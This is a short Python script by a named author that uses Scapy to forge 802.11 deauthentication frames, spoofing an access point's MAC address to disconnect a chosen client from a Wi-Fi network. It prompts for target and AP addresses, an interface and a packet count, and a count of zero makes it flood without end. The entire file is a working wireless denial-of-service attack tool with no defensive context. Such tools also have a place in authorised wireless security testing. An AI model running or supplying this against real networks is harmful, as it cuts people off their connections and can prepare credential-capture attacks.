#!/usr/bin/env python3
# Send DeathAuth Packets
# Author Yehia Elghaly

from scapy.all import *
from colorama import Fore, Back, Style

def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="wlan0mon", verbose=1):
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)

if __name__ == "__main__":
    client = input(Fore.GREEN + "Enter Client MAC: ")
    APM = input("Enter AP MAC: ")
    count = int(input("Number of Packets: "))
    interval = 0.1
    iface = input("Interface?: ")
    verbose = 1
    if count == 0:
        loop = 1
        count = None
    else:
        loop = 0
    print (Fore.RED + "Sending Death Packets")
    print ("")
    deauth(client, APM, interval, count, loop, iface, verbose)